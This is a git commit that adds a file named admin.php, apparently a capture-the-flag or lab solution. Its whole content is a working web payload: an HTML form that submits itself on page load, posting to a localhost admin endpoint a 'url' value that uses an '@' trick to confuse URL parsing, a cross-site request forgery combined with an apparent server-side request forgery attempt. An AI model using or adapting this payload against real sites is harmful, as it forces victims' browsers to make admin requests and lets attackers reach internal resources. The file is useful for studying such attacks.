300e4f8da601857ecba81d92cdfc87f90cca09d7
Mohammed Amer <53377619+OldMohamm@users.noreply.github.com>
2025-09-07 16:19:24 +0300

    Add files via upload

---
+++ admin.php
@@ -0,0 +1,4 @@
+<form id=f method=POST action="http://localhost:5000/admin.php">
+  <input name="url" value="http://localhost:5000/admin.php@localhost:5000/tx.yaml">
+</form>
+<script>f.submit()</script>
